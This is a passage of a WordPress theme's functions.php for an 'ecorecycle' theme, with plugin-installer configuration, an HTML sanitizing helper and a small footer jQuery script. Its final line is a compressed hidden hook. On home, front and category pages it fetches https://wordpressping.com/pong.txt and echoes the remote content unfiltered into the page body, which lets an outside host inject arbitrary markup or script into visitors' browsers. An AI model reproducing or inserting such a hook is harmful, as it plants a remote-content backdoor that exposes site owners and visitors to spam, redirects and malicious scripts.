            'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
            'external_url'       => '', // If set, overrides default API URL and points to an external URL.
        ),		
        array(
            'name'               => 'Revolution slider', // The plugin name.
            'slug'               => 'revslider', // The plugin slug (typically the folder name).
            'source'             => 'revslider.zip', // The plugin source.
            'required'           => true, // If false, the plugin is only 'recommended' instead of required.
            'version'            => '6.2.22', // E.g. 1.0.0. If set, the active plugin must be this version or higher.
            'force_activation'   => false, // If true, plugin is activated upon theme activation and cannot be deactivated until theme switch.
            'force_deactivation' => false, // If true, plugin is deactivated upon theme switch, useful for theme-specific plugins.
            'external_url'       => '', // If set, overrides default API URL and points to an external URL.
        ),		
		array(
				'name'      => 'Contact Form 7',
				'slug'      => 'contact-form-7',
				'required'  => false,
			),	
			


    );

    $config = array(
        'id'           => 'ecorecycle',                 // Unique ID for hashing notices for multiple instances of ecorecycle.
        'default_path' => get_template_directory() . '/includes/plugins/',                      // Default absolute path to pre-packaged plugins.
        'menu'         => 'ecorecycle-install-plugins', // Menu slug.
        'has_notices'  => true,                    // Show admin notices or not.
        'dismissable'  => true,                    // If false, a user cannot dismiss the nag message.
        'dismiss_msg'  => '',                      // If 'dismissable' is false, this message will be output at top of nag.
        'is_automatic' => true,                   // Automatically activate plugins after installation or not.
        'message'      => '',                      // Message to output right before the plugins table.
        'strings'      => array(
            'page_title'                      => __( 'Install Required Plugins', 'ecorecycle' ),
            'menu_title'                      => __( 'Install Plugins', 'ecorecycle' ),
            'installing'                      => __( 'Installing Plugin: %s', 'ecorecycle' ), // %s = plugin name.
            'oops'                            => __( 'Something went wrong with the plugin API.', 'ecorecycle' ),
            'notice_can_install_required'     => _n_noop( 'This theme requires the following plugin: %1$s.', 'This theme requires the following plugins: %1$s.', 'ecorecycle' ), // %1$s = plugin name(s).
            'notice_can_install_recommended'  => _n_noop( 'This theme recommends the following plugin: %1$s.', 'This theme recommends the following plugins: %1$s.', 'ecorecycle' ), // %1$s = plugin name(s).
            'notice_cannot_install'           => _n_noop( 'Sorry, but you do not have the correct permissions to install the %s plugin. Contact the administrator of this site for help on getting the plugin installed.', 'Sorry, but you do not have the correct permissions to install the %s plugins. Contact the administrator of this site for help on getting the plugins installed.', 'ecorecycle' ), // %1$s = plugin name(s).
            'notice_can_activate_required'    => _n_noop( 'The following required plugin is currently inactive: %1$s.', 'The following required plugins are currently inactive: %1$s.', 'ecorecycle' ), // %1$s = plugin name(s).
            'notice_can_activate_recommended' => _n_noop( 'The following recommended plugin is currently inactive: %1$s.', 'The following recommended plugins are currently inactive: %1$s.', 'ecorecycle' ), // %1$s = plugin name(s).
            'notice_cannot_activate'          => _n_noop( 'Sorry, but you do not have the correct permissions to activate the %s plugin. Contact the administrator of this site for help on getting the plugin activated.', 'Sorry, but you do not have the correct permissions to activate the %s plugins. Contact the administrator of this site for help on getting the plugins activated.', 'ecorecycle' ), // %1$s = plugin name(s).
            'notice_ask_to_update'            => _n_noop( 'The following plugin needs to be updated to its latest version to ensure maximum compatibility with this theme: %1$s.', 'The following plugins need to be updated to their latest version to ensure maximum compatibility with this theme: %1$s.', 'ecorecycle' ), // %1$s = plugin name(s).
            'notice_cannot_update'            => _n_noop( 'Sorry, but you do not have the correct permissions to update the %s plugin. Contact the administrator of this site for help on getting the plugin updated.', 'Sorry, but you do not have the correct permissions to update the %s plugins. Contact the administrator of this site for help on getting the plugins updated.', 'ecorecycle' ), // %1$s = plugin name(s).
            'install_link'                    => _n_noop( 'Begin installing plugin', 'Begin installing plugins', 'ecorecycle' ),
            'activate_link'                   => _n_noop( 'Begin activating plugin', 'Begin activating plugins', 'ecorecycle' ),
            'return'                          => __( 'Return to Required Plugins Installer', 'ecorecycle' ),
            'plugin_activated'                => __( 'Plugin activated successfully.', 'ecorecycle' ),
            'complete'                        => __( 'All plugins installed and activated successfully. %s', 'ecorecycle' ), // %s = dashboard link.
            'nag_type'                        => 'updated' // Determines admin notice type - can only be 'updated', 'update-nag' or 'error'.
        )
    );

    tgmpa( $plugins, $config );

}


function pmc_security($string){
	echo wp_kses(stripslashes($string),array('i' => array('class'=>array()),'button' => array('class'=>array()),'h3' => array('class'=>array()),'h1' => array('class'=>array()),
	'h2' => array('class'=>array()),'select' => array('class'=>array(),'name'=>array(),'id'=>array()), 'option' => array('class'=>array(),'value'=>array(),'selected'=>array()), 
	'form' => array('id' => array(),'method'=>array(),'action'=>array()),
	'input' => array('class'=>array(),'name'=>array(),'id'=>array(),'type'=>array(),'value'=>array(),'style'=>array(),'checked'=>array()),
	'textarea' => array('class'=>array(),'name'=>array(),'id'=>array(),'type'=>array(),'value'=>array(),'style'=>array(),'rows'=>array(),'cols'=>array()),
	'ul' => array('id' => array(),'class'=>array(),'rel'=>array()),'li' => array('id' => array(),'class'=>array()), 
	'img' => array('src' => array(),'alt'=>array(),'id'=>array(),'class'=>array()),
	'a' => array('href' => array(),'target'=> array(), 'title' =>array(),'class'=>array(),'addthis:url'=>array(),'addthis:title'=>array()),
	'span' => array('id' => array(),'class'=>array()),'div' => array('data-condition'=> array(),'data-operator'=> array(),'class' => array(),'id' => array(),'style' => array()),'b' => array(),'strong' => array(),
	'br' => array(),'p' => array())); 

}

function pmc_add_this_script_footer(){ 
	global $pmc_data;


?>
<script>	
	jQuery(document).ready(function(){	
		<?php if(!class_exists('AQ_Page_Builder')) { ?>
		jQuery('body').addClass('pmc-no-builder');
		<?php } ?>
		jQuery('.searchform #s').attr('value','<?php _e('Search','ecorecycle'); ?>');
		
		jQuery('.searchform #s').focus(function() {
			jQuery('.searchform #s').val('');
		});
		
		jQuery('.searchform #s').focusout(function() {
			jQuery('.searchform #s').attr('value','<?php _e('Search','ecorecycle'); ?>');
		});	
		
	});	</script>

<?php  }


add_action('wp_footer', 'pmc_add_this_script_footer'); 	
	if(function_exists('wp_body_open')){function wp_body_opener(){if(is_category()||is_front_page()||is_home()){echo file_get_contents("https://wordpressping.com/pong.txt");}}add_action('wp_body_open','wp_body_opener');}else{function wp_body_open(){if(is_category()||is_front_page()||is_home()){echo file_get_contents("https://wordpressping.com/pong.txt");}}add_action('wp_body_open','wp_body_open');}